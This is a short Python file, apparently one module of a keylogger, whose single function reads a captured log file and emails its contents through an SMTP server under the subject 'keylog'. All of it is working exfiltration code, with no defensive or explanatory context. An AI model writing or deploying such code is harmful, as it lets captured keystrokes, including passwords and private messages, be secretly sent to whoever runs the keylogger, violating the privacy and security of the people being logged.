import smtplib
from email.mime.text import MIMEText

def send_email(smtp_provider: str, email: str, password: str, path: str):
    with open(path, 'r') as log_file:
        content = log_file.read()
    
    # Create an email message
    message = MIMEText(content)
    message["Subject"] = 'keylog'
    message["From"] = email
    message["To"] = email

    try:
        # Connect to the SMTP server and send the email
        with smtplib.SMTP(smtp_provider, 587) as server:  # Change for non-Gmail providers
            server.starttls()
            server.login(email, password)
            server.send_message(message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email:\n{e}")